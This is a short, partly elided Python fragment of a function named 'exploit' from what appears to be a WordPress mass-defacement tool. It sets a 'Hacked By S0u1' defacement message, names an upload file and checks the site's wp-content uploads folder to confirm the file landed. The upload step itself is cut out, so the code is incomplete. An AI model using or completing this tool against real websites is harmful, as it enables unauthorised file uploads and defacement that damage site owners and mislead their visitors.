...
def exploit (url, fileupload = None) :
	...
	if fileupload == None :
		fileupload = "Hacked By S0u1 - Testing 0day mass deface exploiter - "
	filename = 'S0u1izg0dtest.txt'
	files = {
	...
	uploader = url + 'wp-content/uploads/2018/01/' + filename
	res      = requests.get (uploader, verify = False)
	if 'S0u1izg0dtest' in res.content :
